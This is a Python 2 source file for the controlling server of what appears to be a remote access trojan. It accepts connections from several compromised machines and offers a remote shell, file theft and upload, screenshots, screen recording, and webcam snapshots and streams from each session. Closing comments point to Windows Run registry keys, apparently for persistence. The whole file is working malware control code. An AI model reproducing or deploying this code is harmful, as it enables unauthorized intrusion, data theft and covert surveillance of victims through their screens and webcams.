#-*- coding: utf-8 -*
import socket
import os
import time
import threading
import pickle
import cv2
import warnings
warnings.filterwarnings("ignore")

class Server:
    def __init__(self,ip,port):
        self.addr = (ip,port)
        self.all = []
        self.alllinks = []
        self.using = -1
        self.exitcode = 0
        self.nowcheck = -1
        self.lock = threading.RLock()
        self.wide = 1024 * 1024
        self.inits = 0
        print "[+]Init Successfully"


    #bind port
    def bind(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(self.addr)
        self.sock.listen(50)
        print "[+]Listening...Address:%s:%s"%self.addr


    #wait link
    def links(self):
        while not self.exitcode:
            cli, (ip, port) = self.sock.accept()
            self.all.append(cli)
            self.alllinks.append((ip, port))
            print "\a[+]Connect from:" + ip + ':' + str(port)


    #state check
    def state(self):
        while not self.exitcode:
            for i in range(0,len(self.all)):
                if not i == self.using:
                    try:
                        self.nowcheck = i
                        self.sendobj(self.all[i],"state")
                        self.nowcheck = -1
                    except:
                        self.lock.acquire()
                        print "[-]disconnect:"+str(self.alllinks[i])
                        self.all[i].close()
                        self.all.pop(i)
                        self.alllinks.pop(i)
                        self.using -= 1
                        self.lock.release()
                        break
            time.sleep(1)


    #mycontrol
    def nowlook(self):
        if not self.inits:
            self.inits = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.inits.bind(('0.0.0.0',12315))
        self.inits.listen(5)
        print "[+]Init OK:Please open accept.py"
        mycon, (ip, port) = self.inits.accept()
        print "[+]show linked:"+ip+":"+str(port)
        return mycon


    #show session
    def show(self):
        for i in range(0,len(self.alllinks)):
            print str(i) + ":" + str(self.alllinks[i])


    #send base
    def sendobj(self,cli,data):
        data = pickle.dumps(data)
        length = len(data)
        cli.sendall(str(length))
        while not cli.recv(1024) == "recv_length":
            continue
        cli.sendall(data)
        while not cli.recv(1024) == "recv_data":
            continue


    #recevie base
    def recvobj(self,cli):
        length = int(cli.recv(1024))
        cli.sendall("recv_length")
        data = ""
        while not length == len(data):
            data += cli.recv(length * 2)
        cli.sendall("recv_data")
        data = pickle.loads(data)
        return data


    #controller
    def control(self):
        while True:
            print "control>",
            cmd = raw_input()
            if cmd == "s":
                self.show()
            elif cmd == "c":
                print "session>",
                session = raw_input()
                while True:
                    try:
                        session = int(session)
                        break
                    except:
                        print "session>",
                        session = raw_input()
                if session >= len(self.alllinks) or session < 0:
                    print "session not exist"
                    continue
                else:
                    while self.nowcheck == session:
                        time.sleep(1)
                    self.using = session
                    self.check(self.all[session])
            elif cmd == "h":
                print "c:control s:session h:help e:exit"
            elif cmd == "e":
                self.exitf()
                return


    #control exit
    def exitf(self):
        self.exitcode = 1
        for i in self.all:
            i.close()
        exit(0)


    #control main
    def check(self,cli):
        while True:
            try:
                print "command>",
                sendcmd = raw_input()
                if not sendcmd:
                    self.sendobj(cli,"space")
                    continue
                if sendcmd == "sh":
                    self.shell(cli)
                elif sendcmd == "fd":
                    self.filerecv(cli)
                elif sendcmd == "fu":
                    self.filesend(cli)
                elif sendcmd == "ss":
                    self.screenshot(cli)
                elif sendcmd == "sv":
                    self.screen_stream(cli)
                elif sendcmd == "sl":
                    self.screen_stream(cli,True)
                elif sendcmd == "ws":
                    self.webcam_snap(cli)
                elif sendcmd == "wv":
                    self.webcam_stream(cli)
                elif sendcmd == "wl":
                    self.webcam_stream(cli,True)
                elif sendcmd == "cl":
                    self.close(cli)
                    break
                elif sendcmd == "end":
                    self.end(cli)
                    break
                elif sendcmd == "bg":
                    self.using = -1
                    break
                elif sendcmd == "h":
                    print "sh:shell fd:download fu:upload ss:screenshot"
                    print "sv:screen_stream ws:webcam_snap wv:webcam_stream cl:close"
                    print "end:end bg:background h:help sl:screen_now wl:webcam_now"
                else:
                    print "usage-> h:help"
                    continue
            except Exception as e:
                print "[-]disconnect:" + str(self.alllinks[self.using])
                self.all.pop(self.using)
                self.alllinks.pop(self.using)
                cli.close()
                self.using = -1
                break


    #check int
    def int_check(self, s):
        while True:
            try:
                print s,
                a = raw_input()
                a = int(a)
                break
            except:
                continue
        return a


    # name rule
    def prefix(self, s, s2):
        prefix = 1
        while True:
            filepath = s + str(prefix) + "." + s2
            if not os.path.exists(filepath):
                break
            else:
                prefix += 1
        return filepath


    #shell
    def shell(self,cli):
        self.sendobj(cli,"shell")
        self.recvobj(cli)
        while True:
            try:
                print "shell>",
                sendmsg = raw_input()
                if not sendmsg:
                    self.sendobj(cli, "space")
                    continue
                if not sendmsg == "exit":
                    self.sendobj(cli,sendmsg)
                    print self.recvobj(cli)
                else:
                    self.sendobj(cli, sendmsg)
                    break
            except Exception as e:
                print "[-]shell:"+str(e)
                break


    # recv file
    def filerecv(self, cli):
        self.sendobj(cli, "download")
        print "file>",
        filepath = raw_input()
        self.sendobj(cli, filepath.decode('utf-8').encode('gbk'))
        s = self.recvobj(cli)
        if s == "File Not Exist":
            print s
        else:
            f = open(filepath.split("\\")[-1], "wb")
            f.write(s)
            f.close()
            print "[+]recevied:" + filepath


    # send file
    def filesend(self, cli):
        self.sendobj(cli, "upload")
        print "file>",
        filepath = raw_input()
        self.sendobj(cli, filepath.decode('utf-8').encode('gbk'))
        if not os.path.exists(filepath):
            data = "File Not Exist"
        else:
            f = open(filepath, "rb")
            data = f.read()
            f.close()
        self.sendobj(cli, data)
        print "[+]uploaded:" + filepath


    #screenshot
    def screenshot(self,cli):
        try:
            filepath = self.prefix("screen","jpg")
            self.sendobj(cli,"screenshot")
            data = self.recvobj(cli)
            f = open(filepath,'wb')
            f.write(data)
            f.close()
            print "[+]recevied:"+filepath
        except Exception as e:
            print "[-]Failed:"+str(e)


    #screen video
    def screen_stream(self,cli,look=False):
        try:
            if look:
                mycon = self.nowlook()
            filepath = self.prefix("scr_video","avi")
            self.sendobj(cli,"screen_stream")
            sec = self.int_check("record_time>")
            self.sendobj(cli,str(sec))
            fps = self.int_check("fps>")
            self.sendobj(cli,str(fps))
            size = self.recvobj(cli)
            out = cv2.VideoWriter(filepath, cv2.VideoWriter_fourcc(*'MJPG'), fps,size)
            while True:
                data = self.recvobj(cli)
                if data == "ScreenStream:END":
                    break
                if look:
                    self.sendobj(mycon,data)
                f = open("temp.jpg", 'wb')
                f.write(data)
                f.close()
                data = cv2.imread("temp.jpg")
                out.write(data)
            out.release()
            if look:
                mycon.close()
            os.remove("temp.jpg")
            print "[+]recevied:"+filepath
        except Exception as e:
            print "[-]Failed:"+str(e)


    #photo
    def webcam_snap(self,cli):
        try:
            filepath = self.prefix("cam", "jpg")
            self.sendobj(cli,"webcam_snap")
            data = self.recvobj(cli)
            f = open(filepath, 'wb')
            f.write(data)
            f.close()
            print "[+]Recevied:"+filepath
        except Exception as e:
            print "[-]Failed:"+str(e)


    #camera video
    def webcam_stream(self,cli,look=False):
        try:
            if look:
                mycon = self.nowlook()
            filepath = self.prefix("cam_video", "avi")
            self.sendobj(cli,"webcam_stream")
            sec = self.int_check("record_time>")
            self.sendobj(cli,str(sec))
            fps = self.int_check("fps>")
            self.sendobj(cli,str(fps))
            size = self.recvobj(cli)
            out = cv2.VideoWriter(filepath, cv2.VideoWriter_fourcc(*'MJPG'), fps,size)
            while True:
                data = self.recvobj(cli)
                if look:
                    self.sendobj(mycon,data)
                if data == "WebcamStream:END":
                    break
                f = open("temp.jpg", 'wb')
                f.write(data)
                f.close()
                frame = cv2.imread("temp.jpg")
                out.write(frame)
            out.release()
            if look:
                mycon.close()
            #os.remove("temp.jpg")
            print "[+]recevied:"+filepath
        except Exception as e:
            print "[-]Failed:"+str(e)


    #close port
    def close(self,cli):
        self.sendobj(cli,"close")
        self.all.pop(self.using)
        self.alllinks.pop(self.using)
        cli.close()
        self.using = -1


    #end process
    def end(self,cli):
        self.sendobj(cli, "end")
        cli.close()
        self.all.pop(self.using)
        self.alllinks.pop(self.using)
        self.using = -1





def main():
    ss = Server('0.0.0.0',12316)
    ss.bind()
    t1 = threading.Thread(target=ss.links)
    t1.setDaemon(True)
    t2 = threading.Thread(target=ss.control)
    t3 = threading.Thread(target=ss.state)
    t3.setDaemon(True)
    t1.start()
    t2.start()
    t3.start()
    t2.join()




if __name__ == '__main__':
    main()

#send msg only not file
#send && recv seprate
#reg query HKEY_LOCAL_MACHIEN\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
#reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
